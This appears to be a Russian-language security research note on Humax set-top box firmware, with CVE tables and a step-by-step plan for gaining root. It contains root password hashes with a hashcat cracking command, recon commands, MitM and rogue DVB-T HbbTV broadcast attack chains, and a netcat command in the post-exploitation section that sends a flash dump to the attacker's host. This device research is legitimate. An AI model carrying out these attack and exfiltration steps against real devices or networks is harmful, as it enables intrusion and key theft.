# Анализ уязвимостей прошивки Humax (HD FOX T2 rootfs)

Анализ rootfs из HD FOX T2 (BCM7405, mipsel). Платформа идентична CXHD-5150C
по SoC-семейству, ОС, браузеру и ключевым бинарникам. Различия: Freeview UK
vs Ростелеком (CAS, портал), но ядро/userspace одинаковые.

---

## 1. Вектора атаки (по приоритету)

### 1.1 Opera 9.80 / Presto — браузер (КРИТИЧЕСКИЙ)

**Версия:** Opera/9.80, Opera TV Store/4792, движок Presto (~2012)
**Файл:** `usr/browser/lib/libopera.so` (3.2)

Presto-движок этой эпохи имеет десятки RCE-уязвимостей:
- Heap corruption в HTML-парсере (CVE-2008-5679 и аналоги для 9.80)
- Use-after-free в DOM/JS-движке
- Buffer overflow в обработке SVG, Canvas, CSS

**Эксплуатация:**
1. MitM через ARP spoofing или DNS hijack в локальной сети
2. Перехватить запрос к порталу Ростелеком (`test.humaxtvportal.com` виден в строках)
3. Подменить ответ на HTML с эксплойтом для Presto
4. Получить code execution в контексте браузера (запускается от root)

**Плагины браузера** (расширяют поверхность атаки):
- `libplugin_upgrade.so` — OTA обновление, вызывает `browser_ota_upgrade(uri)`
- `libplugin_sysinfo.so` — системная информация
- `libplugin_ipconfig.so` — сетевые настройки
- `libplugin_lanconfigobject.so` — LAN конфигурация
- `libooif.so` — OIPF/HbbTV объектная модель
- `libplugin_netstate.so` — состояние сети
- `libvideobackend.so` — видео-плеер

### 1.2 UPnP/DLNA MediaServer (ВЫСОКИЙ)

humaxtv содержит встроенный UPnP MediaServer:
- **SSDP** на `239.255.255.250:1900`
- **HTTP сервер** на динамических портах 49152-65535
- Сервисы: `ContentDirectory:1`, `ConnectionManager:1`
- **Загрузка файлов** через DMS на `/mnt/hd2/upload`

**Атаки:**
- SOAP XML injection через UPnP action handlers
- Загрузка произвольных файлов через upload handler
- 76 потенциальных format string уязвимостей в humaxtv (`%s%s%s` паттерны)
- Обход аутентификации (UPnP по стандарту не требует auth)

### 1.3 OTA Upgrade через браузер (ВЫСОКИЙ)

```
browser_ota_upgrade
browser_ota_forced_upgrade
Upgrade params: uri=%s, version%s
```

Если получить JS-исполнение в браузере (1.1), можно вызвать OTA-обновление
с URI на свой сервер → приставка скачает и установит нашу прошивку.
**Это прямой путь к загрузке кастомного ядра без USB.**

### 1.4 Хеши паролей (СРЕДНИЙ)

```
root:$1$7ELGCsEd$indnv.03WmlVFw7DA1ysd0
settop:$1$lwxLCXaO$epH6TjzpH9TJB15eViHNK1
```

- Алгоритм: MD5-crypt ($1$) — быстро ломается на GPU
- **Не взломан:** пробовали ~15500 вариантов (словари STB/Humax/Korean/rockyou-top +
  brute-force a-z0-9 до 6 символов + 15267 строк из firmware). Пароль установлен
  сборочной системой Humax (~1999, день 10933 в shadow). Вероятно внутренний
  инженерный пароль, не из публичных словарей.
- Для полного перебора: `hashcat -m 500 -a 3 hash.txt '?a?a?a?a?a?a?a?a' --increment`
  (M2: ~1 MH/s, 7 символов printable = ~20 часов)
- **НО:** пароль не критичен. На стоковой прошивке нет SSH/telnet. При получении
  shell через эксплойт мы уже root — пароль можно сменить: `echo 'root:x' | chpasswd`

### 1.5 Shared Secret утечка в лог (СРЕДНИЙ)

```
File Open Error: Shared Secret
Shared Secret File Size : %d
Shared Secret Length : %d
Shared Secret : %s     ← ВЫВОДИТ СЕКРЕТ В ЛОГ!
```

Конфиденциальный ключ (вероятно для DRM/CAS) печатается в лог открытым текстом.
При доступе к UART или syslog — секрет виден.

### 1.6 nosettop kernel bypass (СРЕДНИЙ)

Из `etc/init.d/S90settop`:
```bash
if grep -q "nosettop" /proc/cmdline ; then exit 0; fi
```

Если в cmdline ядра передать `nosettop` — humaxtv не запустится.
Из `etc/inittab`:
```
#ttyS0::respawn:/bin/sh   ← закомментирован в release
```

**При кастомном ядре:** добавить `nosettop` в cmdline + раскомментировать
ttyS0 shell → чистый root без humaxtv.

---

## 2. Уязвимые библиотеки — детальный анализ CVE

| Библиотека | Версия | Год | RCE CVE | Всего CVE |
|-----------|--------|-----|---------|-----------|
| Opera/Presto | **9.80** | ~2012 | 5+ | десятки |
| OpenSSL | **1.0.0a** | 2010 | 6+ | 40+ |
| libpng | **1.2.25** | 2008 | 1 (CVSS 9.8) | 3+ |
| libcurl | **7.19.6** | 2009 | 2 | 5+ |
| libfreetype | **6.3.18** | ~2008 | 2 | 4+ |
| uClibc | **0.9.29** | 2007 | 0 (DNS poison) | 2+ |

---

### 2.1 Opera 9.80 / Presto — RCE через браузер (ГЛАВНЫЙ ВЕКТОР)

Движок Presto прекращён в 2013. Opera TV Store/4792 основан на Opera 12.x.
Все CVE ниже исправлены в 12.10–12.13. Наша 9.80 уязвима ко **ВСЕМ**.

| CVE | Тип | Описание | Исправлено |
|-----|-----|----------|------------|
| **CVE-2012-6468** | Heap buffer overflow | Переполнение кучи при обработке HTTP-ответов | Opera 12.11 |
| **CVE-2012-6470** | Memory corruption | Повреждение памяти при обработке GIF-изображений | Opera 12.12 |
| **CVE-2013-1638** | Code execution | RCE через SVG clipPaths | Opera 12.13 |
| **CVE-2013-1637** | Code execution | RCE через DOM event handling | Opera 12.13 |
| **CVE-2012-6465** | Memory corruption | Повреждение памяти через malformed SVG | Opera 12.10 |

**Эксплуатация на нашей платформе:**
- Браузер запускается от **root** → эксплойт сразу даёт root shell
- MIPS32 LE, нет ASLR, возможен executable stack → классический ROP/shellcode
- Доставка: MitM портала (DNS hijack `*.humaxtvportal.com`) или HbbTV broadcast
- Presto — закрытый движок, публичных PoC мало, но уязвимости подтверждены advisory

**Дополнительные векторы через плагины Opera:**
- `libplugin_upgrade.so` → `browser_ota_upgrade(uri)` — OTA с контролируемым URI
- `libooif.so` (OIPF/HbbTV) → доступ к системным объектам через JS

---

### 2.2 OpenSSL 1.0.0a (июнь 2010) — 40+ CVE

**⚠ ВАЖНО: Heartbleed (CVE-2014-0160) НЕ затрагивает ветку 1.0.0!**
Heartbleed появился только в 1.0.1 (функция heartbeat TLS extension).
Ветка 1.0.0 никогда не содержала уязвимый код.

Версия 1.0.0a — самый первый патч-релиз. Все CVE, исправленные в 1.0.0b–1.0.0t,
затрагивают нашу версию. Источник: openssl.org/news/vulnerabilities-1.0.0.html

#### RCE / Memory corruption:

| CVE | CVSS | Тип | Описание | Исправлено |
|-----|------|-----|----------|------------|
| **CVE-2010-3864** | 7.6 | Heap overflow | Race condition в TLS extensions → переполнение кучи (multi-threaded servers) | 1.0.0b |
| **CVE-2012-2110** | 7.5 | Buffer overflow | ASN.1 BIO/FILE parsing → RCE. Crafted DER-данные при вызове `d2i_*` | 1.0.0i |
| **CVE-2014-0195** | 6.8 | Buffer overrun | DTLS fragment handling → arbitrary code execution | 1.0.0m |
| **CVE-2014-3509** | 6.8 | Use-after-free | Race in `ssl_parse_serverhello_tlsext` → запись в freed memory | 1.0.0n |
| **CVE-2014-8176** | 7.5 | Invalid free | DTLS invalid free() → memory corruption → potential RCE | 1.0.0s |
| **CVE-2015-0292** | 7.5 | Buffer overflow | Base64 `EVP_DecodeUpdate` → overflow при malformed input | 1.0.0r |

#### MitM / Crypto (облегчают другие атаки):

| CVE | CVSS | Тип | Описание | Исправлено |
|-----|------|-----|----------|------------|
| **CVE-2014-0224** | 7.4 | CCS injection | ChangeCipherSpec injection → MitM на TLS. **Самый полезный для нас:** перехват HTTPS STB↔портал | 1.0.0m |
| CVE-2016-0703 | 5.0 | SSLv2 DROWN | Утечка ключей через SSLv2 → расшифровка TLS | 1.0.0r |
| CVE-2015-0204 | 4.3 | FREAK | RSA_EXPORT downgrade → MitM | 1.0.0p |
| CVE-2014-3566 | 4.3 | POODLE | SSLv3 CBC padding oracle → расшифровка | 1.0.0o |
| CVE-2016-2107 | 5.0 | Padding oracle | AES-NI CBC padding oracle → расшифровка | 1.0.0t |

**Стратегия:** CVE-2014-0224 (CCS) → MitM TLS → подать exploit page для Opera → root.

---

### 2.3 libpng 1.2.25 — CVE-2010-1205 (CVSS 9.8)

**Buffer overflow в `pngpread.c`** — progressive PNG reading.

- Затрагивает libpng < 1.2.44 / < 1.4.3 (наша 1.2.25 уязвима)
- Переполнение при обработке дополнительных строк PNG
- CVSS 9.8: Network / Low / None — удалённая эксплуатация без аутентификации
- **Публичные PoC:** Exploit-DB, GitHub — crafted PNG файлы
- Использовалась in-the-wild для атак на браузеры (Chrome, Firefox, Opera)

**Доставка crafted PNG:**
- DLNA ContentDirectory Browse → URL на сервер с PNG
- Браузер: `<img src="exploit.png">` на подменённой странице портала
- HbbTV: broadcast-delivered HTML с PNG
- Видеоплеер (thumbnail/poster image)

**MIPS-специфика:** нет ASLR → фиксированные адреса библиотек → надёжный ROP.

---

### 2.4 libcurl 7.19.6 — два RCE + слабый PRNG

| CVE | CVSS | Диапазон | Описание |
|-----|------|----------|----------|
| **CVE-2013-2174** | 6.8 | 7.7 – 7.30.0 | Heap overflow в `curl_easy_unescape()`. Crafted URL → RCE |
| **CVE-2019-5436** | 7.8 | 7.19.4 – 7.64.1 | TFTP heap buffer overflow. Crafted TFTP response → RCE |

Плюс слабый PRNG: `libcurl is now using a weak random seed!`
Предсказуемый random → предсказуемые TLS nonce → упрощает MitM и replay.

**Эксплуатация:**
- CVE-2013-2174: если humaxtv/браузер вызывает `curl_easy_unescape` с нашим URL
- CVE-2019-5436: если STB использует TFTP (обновления, конфиги) — MitM TFTP ответ

---

### 2.5 FreeType ~6.3.18 — два RCE через шрифты

| CVE | CVSS | Описание |
|-----|------|----------|
| **CVE-2010-1797** | 9.3 | Stack overflow в CFF opcode handling. Crafted CFF font → RCE. Использовалась в **JailbreakMe 2.0** (iOS). |
| **CVE-2011-3256** | 9.3 | Memory corruption в Type 1 font handling. Crafted font → RCE. |

**Доставка шрифтов:**
- CSS `@font-face` на подменённой странице портала
- Embedded font в SVG (двойной удар: Opera SVG CVE + FreeType CVE)

---

### 2.6 uClibc 0.9.29 — DNS cache poisoning (enabler)

**CVE-2022-30295** (CVSS 6.5): предсказуемые DNS Transaction ID.
- uClibc / uClibc-ng < 1.0.41 используют sequential/predictable TXID
- Атакующий в той же сети → DNS cache poisoning без ARP spoofing

Не RCE само по себе, но **критический enabler**:
`CVE-2022-30295 (DNS poison) → подмена *.humaxtvportal.com → Opera RCE → root`

---

### 2.7 UPnP/DLNA + MIPS — SQL injection → buffer overflow → root

Техника **Craig Cutlip**, Black Hat USA 2012: "SQL Injection to MIPS Overflows"

**Референсная CVE:** CVE-2013-2745 (MiniDLNA < 1.1.0)
- SQL injection через UPnP SOAP `Search` action в `ContentDirectory`
- SQLite `group_concat()` для наращивания строки → buffer overflow
- Heap/stack overflow → code execution на MIPS

**Применимость к нашей STB:**
- humaxtv содержит UPnP MediaServer с `ContentDirectory:1`
- SQL-запросы к SQLite собираются строковой конкатенацией (видно в strings)
- 76 потенциальных format string в humaxtv (`%s%s%s` паттерны)
- Если SOAP handlers не фильтруют input → та же SQL injection → overflow

**MIPS exploit specifics (BCM7213, BMIPS, little-endian):**
- **Нет ASLR** — адреса библиотек фиксированные, ROP chain стабильный
- **Executable stack** — на многих embedded Linux (проверить `/proc/self/maps`)
- **Cache coherency** — data cache и instruction cache раздельные на MIPS.
  После записи shellcode нужен `cacheflush()` syscall или ROP gadget
  с `cache` инструкцией, иначе CPU исполняет старое содержимое I-cache
- **4-byte alignment** — инструкции MIPS выровнены по 4 байта
- **Нет stack canaries** на uClibc 0.9.29 — нет `-fstack-protector`

---

### 2.8 HbbTV Broadcast Injection — бесконтактная OTA-атака

Исследования: Rafael Scheel (Oneconsult, 2017), Columbia University (2014).

- DVB-T transmitter (~$150: SDR + усилитель) покрывает дом/квартал
- DVB-T transport stream включает URL сигнализации для HbbTV-приложений
- **Нет аутентификации** в транспортном потоке DVB
- Приставка автоматически загружает и исполняет HbbTV app из потока
- Подтверждено на Samsung/Tizen, LG/webOS, Toshiba, Opera-based STB
- **Не требует подключения к сети жертвы** — атака через эфир
- Жертва не видит диалогов — HbbTV загружается автоматически

**Сценарий:**
1. DVB-T передатчик (SDR + GNU Radio + TS muxer)
2. Transport stream с HbbTV signaling → URL exploit сервера
3. Exploit page: Opera Presto CVE → RCE → root shell

---

## 3. Сервисы и открытые порты (ожидаемые)

| Сервис | Порт | Источник |
|--------|------|---------|
| UPnP SSDP | 1900/udp (multicast) | humaxtv (mxDLNA) |
| UPnP HTTP | 49152-65535/tcp (динам.) | humaxtv webserver |
| DTCP | неизвестен/tcp | humaxtv DTCP listener |
| RTP/RTSP | 7002/udp (RTP) | humaxtv streaming |
| dnsmasq | 53/udp (если включён) | etc/init.d/S41dnsmasq |

**BusyBox applets** (скомпилированы): inetd, wget, udhcpc, zcip.
**Нет**: telnetd, httpd, ftpd, nc, ssh.
**Но есть**: tinyftp (отдельный бинарник, не BusyBox).

### tinyftp
```
usr/bin/tinyftp: ELF 32-bit LSB executable, MIPS, MIPS32
```
Полноценный FTP-сервер. Если запущен (проверить на работающей приставке
через nmap) — анонимный доступ или стандартные пароли.

### tcpdump (DEBUG!)
```
usr/bin/tcpdump: ELF 32-bit LSB, with debug_info, not stripped
```
Debug-инструмент **забыт в production-сборке**. Не уязвимость сама по себе,
но подтверждает: сборка НЕ зачищена от debug-артефактов.

---

## 4. Внутренняя архитектура humaxtv

### SQLite базы данных
humaxtv содержит встроенный SQLite с таблицами:
- `TBL_RESERVATION` — записи таймеров
- `TBL_RSV_FAIL` — ошибки записи
- `TBL_ANT` — настройки антенны
- `TBL_MENUCONFIG`, `TBL_USERCONFIG`, `TBL_FACTORYCONFIG` — все настройки

SQL-запросы собираются строками (видно в strings) → **вероятна SQL injection**
через поля, которые приходят из EPG, DLNA browse results, или HbbTV.

### shell-вызовы из humaxtv
```
popen, execve, execlp
EXEC[[[[ %s ]]]]       ← sprintf + system/exec
local_ota_execute
CAB_OTA_EXECUTE
execlp fail!!!
```
Если контролируемые данные попадают в sprintf → `system()` = **command injection**.

### Debug-интерфейс
```
debug    : outputs the current debug level.
debug <n>: sets the debug level to n. Where n is [0-2].
```
Какой-то CLI debug-интерфейс. Если доступен через сеть (telnet? UPnP?) —
прямой путь к управлению.

### Файловая система
- `/tmp/cache/0/` — кэш браузера (writable, tmpfs)
- `/tmp/hls-cache` — HLS видео кэш
- `/mnt/hd2/upload` — загрузки через DMS
- `/mnt/hd1/`, `/mnt/hd2/` — HDD разделы
- `/var/lib/humaxtv/network/network.conf` — сетевая конфигурация

---

## 5. План атаки (пошагово)

### Шаг 1: Разведка (0 риск)
```bash
# Подключить рабочую приставку к сети
nmap -sV -p- <IP>              # все TCP порты
nmap -sU -p 1900,53,67,68 <IP> # UDP: SSDP, DNS
# UPnP discovery
gssdp-discover --timeout=5
# Или вручную:
echo -e "M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nMAN:\"ssdp:discover\"\r\nMX:3\r\nST:upnp:rootdevice\r\n\r\n" | nc -u 239.255.255.250 1900
```

### Шаг 2: UPnP fingerprint
Получить device description XML → точная модель, версия прошивки, список сервисов.
Проверить ContentDirectory Browse action → можно ли листить файловую систему.

### Шаг 3: DNS/ARP MitM
```bash
# На своей машине в той же сети:
# arpspoof или настроить роутер
# Перехватить DNS-запросы к *.humaxtvportal.com, *.humax-networks.com
# Перенаправить на свой HTTP-сервер
```

### Шаг 4: Эксплойт браузера
Подать crafted HTML/JS на перехваченный запрос портала:
- JS-payload: вызвать `browser_ota_upgrade` с URI на свой HDF
- Или: reverse shell через `system()` / `popen()` если есть command injection
- Или: crafted PNG для CVE-2010-1205 (libpng RCE)

### Шаг 5: Post-exploitation
```bash
# Из полученного shell:
cat /dev/mtd0 > /tmp/cfe.bin          # дамп CFE (лоадер + ключи)
cat /proc/mtd                          # список партиций
nc <наш_IP> 9999 < /tmp/cfe.bin       # отправить дамп
cat /proc/cpuinfo                      # подтвердить архитектуру
mount                                  # точки монтирования
```

---

## 6. Что проверить на рабочей приставке

| # | Действие | Результат |
|---|----------|----------|
| 1 | nmap полный скан | Список открытых портов |
| 2 | UPnP SSDP discover | Device description XML |
| 3 | Попробовать root/settop хеши через telnet/ssh (если порт открыт) | Shell? |
| 4 | Проверить FTP (tinyftp) | Анонимный доступ к ФС? |
| 5 | Попробовать загрузить файл через DMS upload | Запись в /mnt/hd2/upload? |
| 6 | MitM портального URL | Что запрашивает браузер? |
| 7 | Перехват TLS — CCS injection probe (CVE-2014-0224) | MitM на HTTPS? |

---

## 7. Необходимые инструменты

- **hashcat** — ломать MD5-crypt хеши (`hashcat -m 500`)
- **mitmproxy** или **bettercap** — MitM в сети
- **Metasploit** — эксплойты для Opera/OpenSSL/libpng
- **nmap** — сканирование портов
- **Ghidra** — реверс humaxtv для поиска точных command injection
- **Python HTTP сервер** — раздавать payload

---

## 8. Самый быстрый путь к root

```
Сеть ──→ nmap ──→ порт открыт? ──→ telnet/ftp? ──→ root
   │                                    ↓ нет
   │                              MitM портала
   │                                    ↓
   │                        Opera exploit (JS RCE)
   │                                    ↓
   │                            shell от root
   │                                    ↓
   └──────────────────────→ dump /dev/mtd0 (CFE)
                                        ↓
                                извлечь ключи
                                        ↓
                              подписать своё ядро
```
